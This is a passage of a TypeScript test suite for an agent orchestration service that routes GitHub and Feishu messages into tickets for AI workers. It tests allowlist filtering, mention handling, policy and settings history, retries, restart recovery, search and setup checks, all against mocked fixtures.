  const stranger = commentTrigger({ id: 1, body: 'looks wrong', user: { login: 'someone' }, html_url: 'https://github.com/acme/widgets/pull/7#issuecomment-1', created_at: '2026-09-09T00:00:00Z' }, { number: 7, isPr: true }, 'conversation', 'agent-bot')
  await receive(stranger)
  expect(runtime.store.decisions.byThread('github:7')).toEqual([expect.objectContaining({ kind: 'ignore', reason: [expect.objectContaining({ code: 'not_a_member' })] })])
  const mention = commentTrigger({ id: 2, body: '@agent-bot please fix', user: { login: 'alice' }, html_url: 'https://github.com/acme/widgets/pull/7#issuecomment-2', created_at: '2026-09-09T00:01:00Z' }, { number: 7, isPr: true }, 'conversation', 'agent-bot')
  await receive(mention)
  expect(relays(runtime.masterId).at(-1)).toMatchObject({ kind: 'candidate', strength: 'explicit', trigger_id: mention.id })
  const result = await route({ kind: 'accept', trigger_id: mention.id, title: 'Fix PR 7', worktree_name: 'fix-pr', acknowledgement: 'On it: fixing the review finding.' })
  const ticket = runtime.store.tickets.get((result.ticket as { ticket_id: string }).ticket_id)!
  expect(ticket.channels).toEqual([expect.objectContaining({ source: 'github', address: expect.objectContaining({ number: '7' }) })])
  // The PR's head is a variable of the ticket's execution environment; a prepare command may fetch it.
  expect(Object.fromEntries(runtime.ticketEnvironment(ticket).map(variable => [variable.key, variable.value]))).toMatchObject({ DSH_SUPERAGENT_GITHUB_NUMBER: '7', DSH_SUPERAGENT_GITHUB_PR_HEAD: 'refs/pull/7/head', DSH_SUPERAGENT_FEISHU_CHAT: '' })
  const ci = { ...stranger, id: 'ci-1', human: false, text: 'GitHub PR #7 CI: failing', meta: { ci: true } }
  await receive(ci)
  expect(runtime.store.tickets.get(ticket.id)!.inputs).toEqual([expect.objectContaining({ triggerId: 'ci-1' })])
})

it('relays an allowed sender\'s mention in a new Issue as an explicit candidate from the poll that reads its notification', async () => {
  const issue = { id: 1012, number: 12, title: 'Login fails', body: '@agent-bot please fix the login', state: 'open',
    created_at: '2026-09-09T00:00:00Z', html_url: 'https://github.com/acme/widgets/issues/12', user: { login: 'alice', type: 'User' } }
  const notification = { id: 'n1', updated_at: issue.created_at, reason: 'mention', repository: { full_name: 'acme/widgets' },
    subject: { url: 'https://api.github.com/repos/acme/widgets/issues/12', type: 'Issue', title: issue.title } }
  vi.spyOn(Commands.prototype, 'run').mockResolvedValue(`HTTP/2.0 200 OK\r\nX-Poll-Interval: 60\r\n\r\n${JSON.stringify([notification])}`)
  vi.spyOn(Commands.prototype, 'gh').mockResolvedValue(issue)
  vi.spyOn(Commands.prototype, 'pages').mockResolvedValue([])
  runtime.store.set('github-since', '2026-09-08T23:59:00.000Z')
  await pollRound(runtime.context(githubKind))
  await settle()
  const candidate = relays(runtime.masterId).at(-1)
  expect(candidate).toMatchObject({ kind: 'candidate', strength: 'explicit', trigger_id: key('github-issue', '12'), thread: 'github:12' })
})

it('ignores an allowed sender\'s new Issue that does not mention the agent, and an unlisted sender\'s mention, from the poll that reads them', async () => {
  const poll = async (number: number, body: string, login: string) => {
    const issue = { id: 1000 + number, number, title: 'Login fails', body, state: 'open', created_at: '2026-09-09T00:00:00Z', html_url: `https://github.com/acme/widgets/issues/${number}`, user: { login, type: 'User' } }
    const notification = { id: `n${number}`, updated_at: issue.created_at, reason: 'subscribed', repository: { full_name: 'acme/widgets' },
      subject: { url: `https://api.github.com/repos/acme/widgets/issues/${number}`, type: 'Issue', title: issue.title } }
    vi.spyOn(Commands.prototype, 'run').mockResolvedValue(`HTTP/2.0 200 OK\r\nX-Poll-Interval: 60\r\n\r\n${JSON.stringify([notification])}`)
    vi.spyOn(Commands.prototype, 'gh').mockResolvedValue(issue)
    vi.spyOn(Commands.prototype, 'pages').mockResolvedValue([])
    runtime.store.set('github-since', '2026-09-08T23:59:00.000Z')
    await pollRound(runtime.context(githubKind))
    await settle()
    await settle()
    return key('github-issue', String(number))
  }
  const quiet = await poll(12, 'The login page fails after the update', 'alice')
  expect(runtime.store.decisions.byThread('github:12')).toEqual([expect.objectContaining({ kind: 'ignore', reason: [{ code: 'no_mention', triggerId: quiet }] })])
  const stranger = await poll(13, '@agent-bot please fix the login', 'mallory')
  expect(runtime.store.decisions.byThread('github:13')).toEqual([expect.objectContaining({ kind: 'ignore', reason: [{ code: 'not_a_member', triggerId: stranger }] })])
  expect(relays(runtime.masterId).filter(item => item.kind === 'candidate')).toEqual([])
})

it('keeps Issue Triggers stored before Issues arrived through notifications readable on their Thread', async () => {
  const stored: Trigger = { id: key('github-issue', '5'), source: 'github-issue', threads: [{ source: 'github', id: '5' }],
    actor: { source: 'github', id: 'alice' }, human: true, at: '2026-09-01T00:00:00Z', text: 'Bug\n\ndetails',
    url: 'https://github.com/acme/widgets/issues/5', meta: { number: 5, isPr: false, eligibleAt: '2026-09-02T00:00:00.000Z' } }
  runtime.store.triggers.save(stored)
  runtime.store.threads.save({ key: 'github:5', ref: { source: 'github', id: '5' }, createdAt: stored.at, subscriptions: [], correlated: [],
    pending: [], meta: {} })
  const read = await runTool(undefined, 'orchestrator_read', { resource: `trigger/${stored.id}` })
  expect(read).toMatchObject({ trigger_id: stored.id, source: 'github-issue', text: 'Bug\n\ndetails' })
  const thread = (await api('GET', 'threads/github:5')).body
  expect(thread).toMatchObject({ timeline: [expect.objectContaining({ id: stored.id, source: 'github-issue' })] })
})

it('relaunches running assignments after a restart with a recovery note', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  runtime.executor.resume()
  const recovered = runtime.store.tickets.get(ticket.id)!
  expect(recovered.assignments.map(item => item.state)).toEqual(['ended', 'pending'])
  expect(recovered.inputs).toEqual([expect.objectContaining({ kind: 'text', text: expect.stringContaining('host restarted') })])
  h.claude.pushed.mockClear()
  await runtime.pump()
  await settle()
  expect(runtime.store.tickets.get(ticket.id)!.assignments[1]).toMatchObject({ state: 'running' })
  // The new Assignment's message says only what is new, as the Session holds the first; the launch's own pass delivers the
  // recovery note as it reads.
  expect(relays(sessionId)).toEqual([{ ticket_id: ticket.id, assignment: 2 }, { text: expect.stringContaining('host restarted') }])
})

// Adapted: the follow-up comes from Alice, as one from 'ou_guest' reaches the ticket only as context (Policy.owns, docs/design.md).
it('projects read models for the management page and removes thread subscriptions from the Web surface', async () => {
  const { ticket, trigger, sessionId } = await acceptedTicket()
  const threadKeyValue = `feishu:${CHAT}:om_1`
  expect(overviewOf(runtime)).toMatchObject({ person: [], executor: { queued: 0, maxWorkers: 3, idle: 0 }, flow: { received: 0, accepted: 0, judged: 0 } })
  expect(ticketList(viewsOf(runtime), 'working', 0, 20).items).toEqual([expect.objectContaining({ id: ticket.id, stage: 'working' })])
  expect(ticketList(viewsOf(runtime), 'open', 0, 20).items).toEqual([expect.objectContaining({ id: ticket.id, stage: 'working', sessionId, strength: 'explicit' })])
  expect(ticketDetail(viewsOf(runtime), ticket.id)).toMatchObject({ mandate: { strength: 'explicit' }, decision: { kind: 'accept' }, threads: [expect.objectContaining({ key: threadKeyValue, title: '@bot 修一下回归' })], channels: [expect.objectContaining({ source: 'feishu' })] })
  const follow = feishu('20', '补充：日志在这里', { mentions: [], root_id: 'om_1' })
  await receive(follow)
  expect(threadList(viewsOf(runtime), 'subscribed', 0, 20).items).toEqual([expect.objectContaining({ key: threadKeyValue, lastAt: follow.at, tickets: [{ id: ticket.id, title: '修复回归', state: 'open' }] })])
  const detail = threadDetail(viewsOf(runtime), threadKeyValue, undefined, 50)!
  expect(detail.timeline.map(item => item.id)).toEqual([trigger.id, follow.id])
  expect(detail.timeline[0]!.disposition).toMatchObject({ decision: { outcome: 'accept', ticketId: ticket.id } })
  expect(detail.timeline[1]!.disposition).toMatchObject({ fanout: [ticket.id] })
  expect(search(viewsOf(runtime), '日志在这里', new TextCache(0)).items).toEqual([expect.objectContaining({ id: follow.id, threads: [threadKeyValue], threadTitle: '@bot 修一下回归' })])
  expect(decisionList(viewsOf(runtime), ['accept'], 0, 10)).toEqual({ items: [expect.objectContaining({ kind: 'accept', ticketId: ticket.id, threadTitle: '@bot 修一下回归' })], next_offset: null })
  const thread = runtime.store.threads.get(threadKeyValue)!
  runtime.store.threads.describe(thread.key, { label: 'Named by its source' })
  expect(threadList(viewsOf(runtime), 'all', 0, 20).items[0]).toMatchObject({ title: 'Named by its source' })
  expect((await api('GET', 'state')).body).not.toHaveProperty('tickets')
  // scripts/dsh-superagent and agents read health from GET state (docs/006, Management API); settings and their revisions have their own route.
  expect((await api('GET', 'state')).body).toMatchObject({ health: { runtime: { state: expect.any(String) } }, paused: false, load: { maxWorkers: 3 } })
  expect((await api('GET', 'settings')).body).toMatchObject({ sources: expect.arrayContaining([expect.objectContaining({ id: 'github',
    revision: expect.any(Number), value: expect.objectContaining({ enabled: true }) })]), blocks: { policy: { revision: expect.any(Number) } } })
  expect((await api('POST', `threads/${encodeURIComponent(threadKeyValue)}/unsubscribe`)).body).toMatchObject({ removed: true })
  expect(threadList(viewsOf(runtime), 'subscribed', 0, 20).items).toEqual([])
  await settle()
  expect(injected().length).toBeGreaterThan(0)
})

it('lets an Executor drop only its own ticket from a thread it finds unrelated, but not the thread it started on or its pull request\'s', async () => {
  const { ticket, trigger } = await acceptedTicket()
  const other = await acceptedTicket(feishu('5', '@bot 另一件事'))
  // An attached thread that turns out to be about something else, which another ticket also follows.
  const attached = { source: 'feishu', id: 'oc_side:om_side' }
  subscribe(ticket.id, attached); subscribe(other.ticket.id, attached)
  h.claude.pushed.mockClear()
  expect(await runTool(ticket.id, 'orchestrator_thread_unrelated', { thread: 'feishu:oc_side:om_side', reason: 'It discusses the login page, not this regression.' })).toEqual({ removed: true, thread: 'feishu:oc_side:om_side' })
  expect(runtime.store.threads.get('feishu:oc_side:om_side')!.subscriptions).toEqual([other.ticket.id])
  await vi.waitFor(() => expect(JSON.stringify(injected())).toContain('thread_unrelated'))
  await expect(runTool(ticket.id, 'orchestrator_thread_unrelated', { thread: 'feishu:oc_side:om_side', reason: 'again' })).rejects.toThrow('does not follow that thread')
  await expect(runTool(ticket.id, 'orchestrator_thread_unrelated', { thread: threadKey(trigger.threads[0]!), reason: 'no' })).rejects.toThrow('the ticket started on')
  runtime.engine.bindThread(ticket.id, { source: 'github', id: '7' }, true)
  await expect(runTool(ticket.id, 'orchestrator_thread_unrelated', { thread: 'github:7', reason: 'no' })).rejects.toThrow('pull request')
  // A worker drops only its own ticket: the other ticket's thread is not one this ticket follows.
  await expect(runTool(ticket.id, 'orchestrator_thread_unrelated', { thread: threadKey(other.trigger.threads[0]!), reason: 'no' })).rejects.toThrow('does not follow that thread')
})

it('reports a Source that was switched on as starting until its next pass reports its health', async () => {
  const save = (enabled: boolean) => runtime.settings.save('source:github', { enabled, config: runtime.store.settings().sources.github!.config }, runtime.store.blockRevision('source:github'), 'panel')
  const github = async () => ((await api('GET', 'sources')).body as unknown as { id: string; health: unknown[] }[]).find(source => source.id === 'github')!.health
  await save(false)
  runtime.context(githubKind).report('github', { state: 'paused', detail: 'Off', code: 'sourceOff' })
  await save(true)
  expect(await github()).toEqual([{ name: 'github', state: 'starting', detail: '' }])
  // A part that reports something else, such as a missing CLI, keeps its report: no pass may come to replace it.
  await save(false)
  runtime.context(githubKind).report('github', { state: 'paused', detail: 'x', code: 'feishuCliUnset' })
  await save(true)
  expect(await github()).toEqual([expect.objectContaining({ code: 'feishuCliUnset' })])
})

it('records each settings save with its policy change and the open tickets told about it', async () => {
  await acceptedTicket()
  const settings = runtime.store.settings()
  await runtime.settings.save('executor', { ...settings.executor, maxWorkers: 5 }, runtime.store.blockRevision('executor'), 'panel')
  // What a Source receives is its own configuration, not the Policy; who may originate work there is the Policy's.
  const source = runtime.sources.instance('feishu')!
  await runtime.settings.save('source:feishu', { enabled: true, config: { ...source.config, directMessages: false } }, runtime.store.blockRevision('source:feishu'), 'panel')
  const policy = runtime.store.settings().policy
  await runtime.settings.save('policy', { ...policy, sources: { ...policy.sources, feishu: { ...policy.sources.feishu!, allowed: [...policy.sources.feishu!.allowed, { id: 'ou_bob', name: 'Bob' }] } } }, runtime.store.blockRevision('policy'), 'panel')
  await expect(runtime.settings.save('executor', settings.executor, 0, 'panel')).rejects.toThrow('Settings changed')
  const history = policyHistory(runtime.store, runtime.sources, policyVersion(runtime.store.settings()))
  expect(history.items.slice(0, 3)).toEqual([
    // Another sender on the list bears on no open ticket, so none is told.
    expect.objectContaining({ source: 'panel', block: 'policy', policyChanged: true, notified: [], changes: [expect.objectContaining({ source: 'feishu', field: 'allowed', part: true })] }),
    expect.objectContaining({ source: 'panel', block: 'source:feishu', policyChanged: false, notified: [], changes: [{ code: 'sourceField', source: 'feishu', field: 'directMessages', from: true, to: false }] }),
    expect.objectContaining({ source: 'panel', block: 'executor', policyChanged: false, notified: [], changes: [{ code: 'maxWorkers', from: 3, to: 5 }] }),
  ])
})

it('refuses an accept through orchestrator_route for inferred candidates so proactive work always goes through Eval', async () => {
  const observed = feishu('21', '这个文案好奇怪，改成“浏览网页”吧', { mentions: [] })
  await receive(observed)
  await expect(route({ kind: 'accept', trigger_id: observed.id, title: 'x', worktree_name: 'copy-fix', acknowledgement: 'x' })).rejects.toThrow('explicit requests from allowed senders')
  expect(runtime.store.tickets.list()).toEqual([])
})

// Adapted: the restarted Runtime runs only the terminal's Source, as upstream's had none until its plugin registered one.
it('syncs a Source\'s list once its plugin loads after dsh-superagent started', async () => {
  const next = await restart({}, {}, noSources)
  await next.ready
  vi.mocked(Commands.prototype.lark).mockResolvedValue({ users: [{ member_id: MEMBER, name: 'Alice' }], has_more: false })
  next.sources.register(feishuSource.kind)
  await vi.waitFor(() => expect(next.health['sync:feishu']).toMatchObject({ state: 'ready' }))
})

it('syncs the Feishu part of the Policy from its sync chat in place, and keeps the Policy version when only the order the chat lists changes', async () => {
  const policy = runtime.store.settings().policy
  await runtime.settings.save('policy', { ...policy, sources: { ...policy.sources, feishu: { allowed: [{ id: 'ou_bob', name: 'Bob' }, { id: MEMBER, name: 'Alice' }], syncChat: CHAT } } }, runtime.store.blockRevision('policy'), 'panel')
  vi.mocked(Commands.prototype.lark).mockResolvedValue({ users: [{ member_id: 'ou_erin', name: 'Erin' }, { member_id: MEMBER, name: 'Alice Liddell' }], has_more: false })
  expect(await runtime.settings.sync('feishu')).toEqual({ allowed: [{ id: MEMBER, name: 'Alice Liddell' }, { id: 'ou_erin', name: 'Erin' }], syncChat: CHAT, admission: {} })
  expect(runtime.store.settings().policy.sources.feishu!.allowed.map(entry => entry.id)).toEqual([MEMBER, 'ou_erin'])
  expect(runtime.health['sync:feishu']).toMatchObject({ state: 'ready', detail: '2 allowed' })
  const version = policyVersion(runtime.store.settings())
  vi.mocked(Commands.prototype.lark).mockResolvedValue({ users: [{ member_id: MEMBER, name: 'Alice Liddell' }, { member_id: 'ou_erin', name: 'Erin' }], has_more: false })
  await runtime.settings.sync('feishu')
  expect(policyVersion(runtime.store.settings())).toBe(version)
  await expect(runtime.settings.sync('github')).rejects.toThrow('nothing to sync from')
  vi.mocked(Commands.prototype.lark).mockRejectedValue(new Error('rate limited'))
  await expect(runtime.settings.sync('feishu')).rejects.toThrow('rate limited')
  expect(runtime.health['sync:feishu']).toMatchObject({ state: 'error', detail: expect.stringContaining('rate limited') })
})

it('describes rule edits in the Policy history and skips Policy syncs that change nothing', async () => {
  const settings = runtime.store.settings()
  const revision = () => runtime.store.get('settings-revision') as number
  const before = revision()
  // The sync chat lists exactly the allowed users already, so nothing is saved.
  await runtime.settings.sync('feishu')
  expect(revision()).toBe(before)
  await runtime.settings.save('policy', { ...runtime.store.settings().policy, rules: [{ ...settings.policy.rules[0]!, name: '文案' }, { ...settings.policy.rules[1]!, enabled: false }, { id: 'docs', name: '文档', enabled: true, instruction: 'x' }] }, runtime.store.blockRevision('policy'), 'panel')
  expect(policyHistory(runtime.store, runtime.sources, policyVersion(runtime.store.settings())).items[0]!.changes).toEqual([{ code: 'ruleRenamed', from: 'Copy fixes', to: '文案' }, { code: 'ruleDisabled', name: 'Visual fixes' }, { code: 'ruleAdded', name: '文档' }])
})

it('records an admission table change in the Policy history as one line for its Source, with a new Policy version', async () => {
  const policy = runtime.store.settings().policy
  const version = policyVersion(runtime.store.settings())
  await runtime.settings.save('policy', { ...policy, sources: { ...policy.sources, feishu: { ...policy.sources.feishu!, admission: { [CHAT]: { unlistedAddressed: 'explicit' } } } } }, runtime.store.blockRevision('policy'), 'panel')
  expect(policyVersion(runtime.store.settings())).not.toBe(version)
  expect(policyHistory(runtime.store, runtime.sources, policyVersion(runtime.store.settings())).items[0]!.changes).toEqual([{ code: 'sourceAdmission', source: 'feishu', part: true }])
})

it('retries only a failed, blocked or undelivered ticket with a new assignment, and finds tickets by title in search, and reports unavailable Evals as a problem', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  expect(() => runtime.engine.retryTicket(ticket.id)).toThrow(new UserError('notRetryable'))
  const current = runtime.store.tickets.get(ticket.id)!
  await runTool(ticket.id, 'orchestrator_report', { state: 'failed', summary: 'LlmError: offline' })
  expect(waitsForPerson(runtime.store.tickets.get(ticket.id)!)).toBe(true)
  // A person may continue a failed worker in its Session; only an ended Ticket locks its tools.
  // Adapted: the worker's PreToolUse hook answers for its tools, where upstream registered a DSH tool guard.
  expect(await guard(sessionId)).toBeUndefined()
  const retried = await runtime.engine.retryTicket(ticket.id)
  await settle()
  expect(waitsForPerson(runtime.store.tickets.get(ticket.id)!)).toBe(false)
  expect(runtime.store.tickets.get(ticket.id)!.assignments.map(item => item.state)).toEqual(['ended', 'running'])
  expect(retried.assignments.length).toBeGreaterThan(current.assignments.length)
  expect(retried.assignments.at(-2)!.endedReason).toBe('retried')
  // The worker's Session holds the assignment, so the new one says only that a person retried it.
  expect(relays(sessionId).at(-1)).toEqual({ ticket_id: ticket.id, assignment: 2, note: expect.stringContaining('A person retried this ticket') })
  // A Session someone deleted gets the whole first message again with the next Assignment.
  // Adapted: the worker's turns end, so its query closes, and its Session goes from disk, where upstream deleted the DSH agent.
  runtime.store.atomic(() => { runtime.engine.report(ticket.id, { state: 'failed', summary: 'LlmError: offline' }) })
  await endTurns(sessionId)
  await waitUntil(() => !h.claude.session(sessionId).query)
  h.claude.sessions.delete(sessionId)
  runtime.engine.retryTicket(ticket.id)
  await settle()
  expect(relays(sessionId).at(-1)).toMatchObject({ ticket_id: ticket.id, title: '修复回归', trigger: expect.objectContaining({ text: '@bot 修一下回归' }) })
  expect(search(viewsOf(runtime), '修复', new TextCache(0)).tickets).toEqual([expect.objectContaining({ id: ticket.id })])
  expect(decisionList(viewsOf(runtime), [], 0, 10, '2999-01-01T00:00:00Z').items).toEqual([])
  const accepted = runtime.store.read.recentDecisions(0, 1)[0]!
  runtime.store.decisions.save({ ...accepted, id: 'unavailable-1', kind: 'unavailable', reason: [{ code: 'timeout' }], at: new Date().toISOString() })
  const unjudged = () => overviewOf(runtime).problems.filter(problem => problem.kind === 'eval-unavailable')
  expect(unjudged()).toEqual([expect.objectContaining({ thread: expect.objectContaining({ key: accepted.threadKey }), reason: [{ code: 'timeout' }], triggerId: accepted.triggerIds[0] })])
  // Health shows it as an error for an hour, which `status` reports, and not as a runtime error on the overview.
  expect(evalsHealth(runtime.store)).toMatchObject({ state: 'error', detail: expect.stringContaining('Assessment timed out') })
  expect(evalsHealth(runtime.store, Date.now() + 3_700_000)).toMatchObject({ state: 'ready' })
  await runtime.pump()
  expect(runtime.health.evals).toMatchObject({ state: 'error' })
  expect(overviewOf(runtime).problems.filter(problem => problem.kind === 'runtime-error')).toEqual([])
  // A person's dismissal removes it without a new judgement; only unavailable Evals can be dismissed.
  expect(await api('POST', `decisions/${accepted.id}/dismiss`)).toMatchObject({ status: 404, body: { error: 'Unavailable Eval not found', code: 'unknownProblem' } })
  expect(await api('POST', 'decisions/unavailable-1/dismiss')).toEqual({ status: 200, body: { dismissed: true } })
  expect(unjudged()).toEqual([])
  expect(evalsHealth(runtime.store)).toMatchObject({ state: 'ready' })
  expect(runtime.store.decisions.get('unavailable-1')).toMatchObject({ dismissed: true })
  runtime.store.decisions.save({ ...runtime.store.decisions.get('unavailable-1')!, dismissed: undefined })
  expect(unjudged()).toHaveLength(1)
  // A later judgement on the same Thread resolves it.
  runtime.store.decisions.save({ ...accepted, id: 'ignore-2', kind: 'ignore', reason: [said('context only')], at: new Date().toISOString() })
  expect(unjudged()).toEqual([])
})

it('links Channels and Threads for people, finds tickets by a bare PR number, and keeps ended subscriptions out of the default Thread filter', async () => {
  const { ticket } = await acceptedTicket(feishu('1', '@_user_1 修一下回归', { mentions: [{ id: 'ou_bot', key: '@_user_1', name: 'dsh-superagent' }] }))
  const home = `feishu:${CHAT}:om_1`
  expect(runtime.store.triggers.get(key('feishu', 'om_1'))!.text).toBe('@dsh-superagent 修一下回归')
  const chatLink = `https://applink.feishu.cn/client/chat/open?openChatId=${CHAT}`
  expect(ticketDetail(viewsOf(runtime), ticket.id)!.channels).toEqual([expect.objectContaining({ source: 'feishu', url: chatLink })])
  expect(threadDetail(viewsOf(runtime), home, undefined, 10)!.url).toBe(chatLink)
  // A pull request the Ticket opened is a Thread it follows as its own.
  runtime.store.tickets.save({ ...runtime.store.tickets.get(ticket.id)!, follows: [{ thread: 'github:4996', own: true }] })
  expect(search(viewsOf(runtime), '4996', new TextCache(0)).tickets).toEqual([expect.objectContaining({ id: ticket.id })])
  expect(threadList(viewsOf(runtime), 'subscribed', 0, 10).items.map(thread => thread.key)).toEqual([home])
  runtime.engine.stopTicket(ticket.id)
  expect(threadList(viewsOf(runtime), 'subscribed', 0, 10).items).toEqual([])
  expect(threadList(viewsOf(runtime), 'all', 0, 10).items.map(thread => thread.key)).toContain(home)
  await receive(feishu('9', '别的群的消息', { chat_id: 'oc_elsewhere' }))
  expect(search(viewsOf(runtime), '别的群', new TextCache(0)).items).toEqual([expect.objectContaining({ filtered: { code: 'chat_not_allowed' }, threadTitle: undefined })])
})

it('counts every step of the day\'s flow over the same arriving messages and lists the same accepted Decisions', async () => {
  const now = String(Date.now())
  await acceptedTicket(feishu('1', '@bot 修一下回归', { create_time: now }))
  await receive(feishu('7', '另一个群', { chat_id: 'oc_elsewhere', create_time: now }))
  const since = new Date(Date.now() - 86_400_000).toISOString()
  expect(overviewOf(runtime).flow).toMatchObject({ received: 2, filtered: 1, triggers: 1, judged: 1, accepted: 1 })
  expect(decisionList(viewsOf(runtime), ['accept', 'reopen'], 0, 10, since).items).toHaveLength(1)
  expect(decisionList(viewsOf(runtime), ['accept', 'reopen'], 0, 10, new Date(Date.now() + 60_000).toISOString()).items).toEqual([])
})

it('queues a requeued trigger visibly and tells the orchestrator', async () => {
  const stranger = commentTrigger({ id: 3, body: 'looks wrong', user: { login: 'someone' }, html_url: 'https://github.com/acme/widgets/pull/8#issuecomment-3', created_at: '2026-09-09T00:00:00Z' }, { number: 8, isPr: true }, 'conversation', 'agent-bot')
  await receive(stranger)
  runtime.store.saveSettings({ ...runtime.store.settings(), paused: true })
  expect(runtime.engine.reevaluate(stranger.id)).toBe(true)
  expect(threadDetail(viewsOf(runtime), 'github:8', undefined, 50)!.timeline[0]!.disposition).toMatchObject({ queued: true })
  await vi.waitFor(() => expect(injected().length).toBeGreaterThan(0))
})

it('asks a question where the human message that raised it was written, not in the ticket\'s original conversation', async () => {
  const { ticket, trigger } = await acceptedTicket()
  subscribe(ticket.id, { source: 'github', id: '42' })
  const review = commentTrigger({ id: 5, body: 'Can you add the reason?', user: { login: 'alice' }, html_url: 'https://github.com/acme/widgets/pull/42#pullrequestreview-5', created_at: '2026-09-09T00:02:00Z' }, { number: 42, isPr: true }, 'review', 'agent-bot')
  await receive(review)
  await expect(runTool(ticket.id, 'orchestrator_report', { state: 'progress', summary: 'x', question_for_trigger_id: review.id })).rejects.toThrow('needs the question it raised')
  await expect(runTool(ticket.id, 'orchestrator_report', { state: 'progress', summary: 'x', human_action: 'Keep it?', question_for_trigger_id: 'unknown' })).rejects.toThrow('the person\'s message that raised it')
  await runTool(ticket.id, 'orchestrator_report', { state: 'progress', summary: 'no stop reason is recorded', human_action: 'Keep the PR and record the reason in a follow-up?', question_for_trigger_id: review.id })
  const queued = vi.spyOn(runtime.outbox, 'send')
  await runTool(undefined, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'attention', human_action: 'Keep the PR and record the reason in a follow-up?', text: 'Keep the PR and record the reason in a follow-up?' })
  expect(queued.mock.calls.at(-1)![0].channel).toEqual(review.channel)
  // A question about the ticket as a whole still goes to where the ticket started.
  await runTool(ticket.id, 'orchestrator_report', { state: 'progress', summary: 'y', human_action: 'Desktop too?' })
  await runTool(undefined, 'orchestrator_reply', { ticket_id: ticket.id, purpose: 'attention', human_action: 'Desktop too?', text: '要不要也改桌面端？' })
  expect(queued.mock.calls.at(-1)![0].channel).toEqual(trigger.channel)
})

it('finds triggers by #PR number, GitHub link prefix and Feishu message id', async () => {
  const comment = commentTrigger({ id: 4, body: 'please check', user: { login: 'alice' }, html_url: 'https://github.com/acme/widgets/pull/9#issuecomment-4', created_at: '2026-09-09T00:00:00Z' }, { number: 9, isPr: true }, 'conversation', 'agent-bot')
  await receive(comment)
  expect(search(viewsOf(runtime), '#9', new TextCache(0)).threads).toEqual([expect.objectContaining({ key: 'github:9' })])
  expect(search(viewsOf(runtime), 'https://github.com/acme/widgets/pull/9', new TextCache(0)).items.map(item => item.id)).toContain(comment.id)
  const message = feishu('30', '随便说说', { mentions: [] })
  await receive(message)
  expect(search(viewsOf(runtime), 'https://x/y?id=om_30', new TextCache(0)).items.map(item => item.id)).toContain(message.id)
})

it('keeps pages of Source reads, prompt previews and Feishu message links in memory, outside the kv area', async () => {
  const message = feishu('30', '随便说说', { mentions: [] })
  await receive(message)
  const link = 'https://applink.feishu.cn/client/message/link/open?token=t30'
  vi.mocked(Commands.prototype.lark).mockResolvedValue({ messages: [{ message_id: 'om_30', chat_id: CHAT, message_app_link: link }] })
  expect(await runTool(undefined, 'orchestrator_read', { resource: `trigger/${message.id}` })).toMatchObject({ source_url: link })
  // An AppLink is found by the links read since dsh-superagent started.
  expect((await api('GET', `search?q=${encodeURIComponent(link)}`)).body).toMatchObject({ items: [expect.objectContaining({ id: message.id })] })
  const config = runtime.prompts.current().config
  const { previews } = await runTool(undefined, 'orchestrator_prompts_save', { config, preview: true }) as { previews: { read: string }[] }
  expect(await runTool(undefined, 'orchestrator_read', { resource: previews[0]!.read, offset: 4000 })).toMatchObject({ offset: 4000 })
  expect(runtime.store.keys('').filter(name => /-read:|source-link:|prompt-preview\//.test(name))).toEqual([])
})

it('reads resources recorded under the pre-vocabulary names', async () => {
  const { ticket, trigger } = await acceptedTicket()
  expect(await runTool(ticket.id, 'orchestrator_read', { resource: `event/${trigger.id}` })).toMatchObject({ trigger_id: trigger.id })
  expect(await runTool(ticket.id, 'orchestrator_read', { resource: `task/${ticket.id}/assignment` })).toMatchObject({ resource: `ticket/${ticket.id}/assignment` })
})

it('leaves waiting and blocked assignments alone after a restart and keeps blocked workers paused', async () => {
  const { ticket } = await acceptedTicket()
  await runTool(ticket.id, 'orchestrator_report', { state: 'blocked', summary: 'need credentials' })
  runtime.executor.resume()
  expect(runtime.store.tickets.get(ticket.id)!.assignments).toHaveLength(1)
  expect(waitsForPerson(runtime.store.tickets.get(ticket.id)!)).toBe(true)
  const other = await acceptedTicket(feishu('12', '@bot 另一个', { root_id: undefined }))
  await runTool(other.ticket.id, 'orchestrator_report', { state: 'progress', summary: 'midway' })
  runtime.executor.resume()
  expect(runtime.store.tickets.get(other.ticket.id)!.assignments.map(item => item.state)).toEqual(['ended', 'pending'])
})

it('waits for setup without the agent\'s GitHub CLI: the panel works, and nothing is polled, assessed or dispatched', async () => {
  const { ticket } = await acceptedTicket()
  await runTool(ticket.id, 'orchestrator_report', { state: 'failed', summary: 'crashed' })
  // Adapted: the Runtime's setup checks again, which upstream's Runtime offered as checkSetup.
  expect(() => runtime.setup.check()).toThrow('Setup is complete')
  // Adapted: no query starts and nothing is pushed, where upstream counted DSH Session creations and deliveries.
  h.claude.sdk.query.mockClear(); h.claude.pushed.mockClear()
  const next = await restart({}, { github: { cli: '' } })
  await next.ready
  expect(next.configured()).toBe(false)
  expect(next.setupProblem).toEqual({ place: 'github', code: 'agentCliUnset', values: {}, detail: 'The agent GitHub CLI is not set.' })
  expect(next.health.runtime).toMatchObject({ state: 'paused', code: 'setupPending' })
  // Adapted: the service is named claude-superagent here.
  expect(() => next.deployment).toThrow('claude-superagent is waiting for setup: The agent GitHub CLI is not set.')
  expect((await api('GET', 'state')).body).toMatchObject({ setup: { problem: { place: 'github' }, accounts: null, machine: { stateDir: h.directory } } })
  expect(overviewOf(next).problems[0]).toEqual({ kind: 'setup', ...next.setupProblem })
  await receive(feishu('30', '@bot 修一下'), next)
  // A retry waits for setup instead of launching a worker that cannot run, and no report reaches the orchestrator.
  await next.engine.retryTicket(ticket.id)
  await settle(next)
  expect(next.store.tickets.get(ticket.id)!.assignments.map(item => item.state)).toEqual(['ended', 'pending'])
  expect(h.claude.sdk.query).not.toHaveBeenCalled()
  expect(h.claude.pushed).not.toHaveBeenCalled()
  // A save that changes nothing records nothing; any other save runs setup again, since it may be the fix, and so does a
  // check after a fix outside dsh-superagent.
  const revision = next.store.get<number>('settings-revision')
  expect(await next.settings.save('policy', next.store.settings().policy, next.store.blockRevision('policy'), 'panel')).toMatchObject({ saved: true, restarting: false })
  expect(next.store.get<number>('settings-revision')).toBe(revision)
  expect(await next.settings.save('policy', { ...next.store.settings().policy, rules: [] }, next.store.blockRevision('policy'), 'panel')).toMatchObject({ saved: true, restarting: true })
  await vi.waitFor(() => expect(h.restart).toHaveBeenCalledTimes(1))
  next.setup.check()
  await vi.waitFor(() => expect(h.restart).toHaveBeenCalledTimes(2))
})

